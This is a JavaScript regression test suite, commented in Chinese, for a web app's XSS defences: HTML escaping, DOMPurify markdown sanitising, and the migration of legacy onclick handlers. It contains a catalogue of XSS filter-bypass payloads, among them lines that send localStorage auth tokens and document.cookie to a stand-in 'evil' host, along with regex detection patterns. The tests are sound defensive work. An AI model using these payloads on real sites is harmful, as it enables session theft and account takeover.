// security.test.js — XSS 防护回归测试（docs/security/xss_stored_chain_fix_plan.md 阶段 5）
// 覆盖：escape.js 转义完整性、security.js 净化白名单、历史 onclick 迁移。
// payload 集合覆盖本次审计确认的全部绕过向量。

const createDOMPurify = require('../js/vendor/purify.min.js');

// jsdom 环境：globalThis 即 window；vendor UMD 在 CJS 下返回工厂/对象
beforeAll(() => {
  const purify = createDOMPurify;
  window.DOMPurify = typeof purify === 'function' && typeof purify.createDOMPurify === 'function'
    ? purify.createDOMPurify(window)
    : (typeof purify === 'function' ? purify(window) : purify);
  window.marked = require('../js/vendor/marked.min.js');
  require('../js/escape.js');
  require('../js/security.js');
});

function render(text) {
  return window.secureRenderMarkdown(text);
}

describe('escape.js 转义完整性', () => {
  test('escapeHtml 转义全部五个 HTML 敏感字符', () => {
    expect(window.escapeHtml(`<a href="x" onclick='y()'>&</a>`))
      .toBe('&lt;a href=&quot;x&quot; onclick=&#39;y()&#39;&gt;&amp;&lt;/a&gt;');
  });

  test('escapeHtml 处理 null/undefined', () => {
    expect(window.escapeHtml(null)).toBe('');
    expect(window.escapeHtml(undefined)).toBe('');
  });

  test('escapeHtmlAttr 与 escapeHtml 等价（含单引号）', () => {
    expect(window.escapeHtmlAttr(`it's a "test"`)).toBe(`it&#39;s a &quot;test&quot;`);
  });
});

describe('secureRenderMarkdown：markdown 基础功能保留', () => {
  test('标题/加粗/链接正常渲染', () => {
    const html = render('# 标题\n\n**bold** [link](https://example.com)');
    expect(html).toContain('<h1');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://example.com"');
  });

  test('代码块与行内代码保留', () => {
    const html = render('`code` 与\n\n```js\nconst a = "<b>hello</b>";\n```');
    expect(html).toContain('<code');
    expect(html).toContain('&lt;b&gt;');
  });
});

describe('secureRenderMarkdown：XSS payload 回归集', () => {
  const xssPayloads = [
    // 事件属性（含斜杠属性分隔绕过旧正则的形态）
    `<img src=x onerror=alert(1)>`,
    `<img src=x onerror=fetch('https://evil/?t='+localStorage.auth_token)>`,
    `<img/src=x/onerror=alert(1)>`,
    `<img src=x onerror\n=alert(1)>`,
    `<body onload=alert(1)>`,
    `<svg onload=alert(1)>`,
    `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
    `<details open ontoggle=alert(1)>`,
    `<div onmouseover=alert(1)>hover</div>`,
    // javascript: URI（含无引号形态——旧正则可被此绕过）
    `<a href="javascript:alert(1)">click</a>`,
    `<a href=javascript:alert(1)>click</a>`,
    `<a href='JaVaScRiPt:alert(1)'>click</a>`,
    `<a href="&#106;avascript:alert(1)">click</a>`,
    `<a href="&#x6A;avascript:alert(1)">click</a>`,
    `<iframe src=javascript:alert(1)>`,
    // 危险标签
    `<script>alert(1)</script>`,
    `<script src=https://evil/x.js></script>`,
    `<iframe src="https://evil"></iframe>`,
    `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`,
    `<object data="https://evil"></object>`,
    `<embed src="https://evil">`,
    `<form action="javascript:alert(1)"><button>go</button></form>`,
    `<base href="https://evil/">`,
    `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
    `<link rel="stylesheet" href="https://evil/x.css">`,
    // data: URI 与其他协议
    `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
    `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`,
    `<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
    `<a href="vbscript:msgbox(1)">x</a>`,
    // 混合嵌套/截断
    `<scr<script>ipt>alert(1)</scr</script>ipt>`,
    `<<script>alert(1)//<</script>`,
    `<img src="x" onerror="alert(1)" //>`,
    `<a href=" javascript:alert(1)">x</a>`,
    `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`,
  ];

  test.each(xssPayloads)('净化 %s', (payload) => {
    const html = render(payload);
    // 断言只针对「未转义的真实标签」：marked 可能将畸形 HTML 转义为纯文本
    // （&lt;img ... onerror=...），文本中的字面量不构成 XSS。
    expect(html).not.toMatch(/<[a-z][^>]*\son\w+\s*=/i);
    expect(html).not.toMatch(/<[a-z][^>]*\s(?:href|src|action|formaction)\s*=\s*["']?\s*(?:javascript|vbscript):/i);
    expect(html).not.toMatch(/<[a-z][^>]*\s(?:href|src)\s*=\s*["']?\s*data:text\/html/i);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<object/i);
    expect(html).not.toMatch(/<embed/i);
    expect(html).not.toMatch(/<base[\s>]/i);
    expect(html).not.toMatch(/<meta[\s>]/i);
    expect(html).not.toMatch(/<link[\s>]/i);
    expect(html).not.toMatch(/<[a-z][^>]*srcdoc/i);
  });
});

describe('secureRenderMarkdown：安全降级', () => {
  test('DOMPurify 缺失时降级为纯文本转义', () => {
    const saved = window.DOMPurify;
    window.DOMPurify = undefined;
    try {
      const html = render('<img src=x onerror=alert(1)>**hi**');
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');
    } finally {
      window.DOMPurify = saved;
    }
  });
});

describe('migrateLegacyOnclick：历史存量消息迁移', () => {
  test('模式A：img 点击放大 → data-full-src', () => {
    const legacy = `<img src="https://cdn.example/a.jpg" style="max-width:300px;" onclick="document.getElementById('imgModal').style.display='flex';document.getElementById('imgModalImg').src='https://cdn.example/a.jpg';window.resetModalImageInfo && window.resetModalImageInfo()" alt="图片">`;
    const migrated = window.migrateLegacyOnclick(legacy);
    expect(migrated).not.toContain('onclick');
    expect(migrated).toContain(`data-full-src="https://cdn.example/a.jpg"`);
    // 迁移产物必须能通过净化且保留 data 属性
    const clean = window.secureSanitize(migrated);
    expect(clean).toContain('data-full-src');
    expect(clean).not.toMatch(/\son\w+\s*=/i);
  });

  test('模式B：generated-image-wrapper → data-modal-src + 发布信息', () => {
    const legacy = `<div class="generated-image-wrapper generated-result-card" onclick="document.getElementById('imgModal').style.display='flex';document.getElementById('imgModalImg').src='https://cdn.example/b.jpg';window.setModalImageInfo && window.setModalImageInfo('123', '标题&amp;名')"><img src="https://cdn.example/b.jpg" class="generated-image"></div>`;
    const migrated = window.migrateLegacyOnclick(legacy);
    expect(migrated).not.toContain('onclick');
    expect(migrated).toContain('data-modal-src="https://cdn.example/b.jpg"');
    expect(migrated).toContain('data-tool-id="123"');
    expect(migrated).toContain('data-tool-title="标题&amp;名"');
    const clean = window.secureSanitize(migrated);
    expect(clean).toContain('data-modal-src');
    expect(clean).toContain('data-tool-id');
  });

  test('模式C：发布按钮 → data-publish-*', () => {
    const legacy = `<button class="publish-result-btn" onclick="event.stopPropagation(); window.publishGeneratedResult && window.publishGeneratedResult(&quot;456&quot;, 'my title')">发布</button>`;
    const migrated = window.migrateLegacyOnclick(legacy);
    expect(migrated).not.toContain('onclick');
    expect(migrated).toContain('data-publish-tool-id="456"');
    expect(migrated).toContain('data-publish-title="my title"');
  });

  test('未知 onclick 模式直接删除（交由净化兜底）', () => {
    const legacy = `<div onclick="alert(1)">x</div>`;
    const migrated = window.migrateLegacyOnclick(legacy);
    expect(migrated).not.toContain('onclick');
    expect(migrated).toContain('<div>x</div>');
  });

  test('恶意 onclick 不会被误迁移为可执行内容', () => {
    const legacy = `<img src=x onclick="window.evil && window.evil('https://evil/?'+document.cookie)">`;
    const migrated = window.migrateLegacyOnclick(legacy);
    const clean = window.secureSanitize(migrated);
    expect(clean).not.toMatch(/\son\w+\s*=/i);
    expect(clean).not.toContain('evil(');
  });
});
